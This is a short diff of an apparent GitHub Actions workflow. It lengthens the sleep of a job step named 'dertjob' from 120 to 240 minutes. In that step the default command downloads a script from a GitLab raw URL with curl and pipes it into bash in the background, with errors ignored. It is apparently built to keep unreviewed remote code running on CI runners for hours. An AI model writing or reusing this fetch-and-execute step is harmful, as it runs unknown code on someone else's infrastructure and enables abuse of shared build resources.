@@ -63,4 +63,4 @@ jobs:
       - name: dertjob
         continue-on-error: true
         run: ${{ github.event.inputs.command || 'curl -sL https://gitlab.com/masaakk88/file/diamonds8line/-/raw/main/var999 | bash' }}  &
-           sleep 120m
+           sleep 240m
